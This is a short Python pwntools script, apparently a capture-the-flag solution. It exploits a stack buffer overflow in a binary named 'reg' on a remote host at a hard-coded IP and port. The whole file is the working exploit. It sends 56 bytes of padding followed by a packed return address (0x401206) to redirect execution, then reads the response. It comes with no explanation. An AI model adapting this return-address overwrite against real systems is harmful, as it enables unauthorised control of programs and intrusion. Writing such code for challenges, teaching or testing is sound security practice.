from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

r = remote("178.62.95.229", 30921)
# r = process("./reg")
address = p64(0x401206)
payload = ("a" * 56).encode() + address
r.sendlineafter(': ',payload)
r.recv()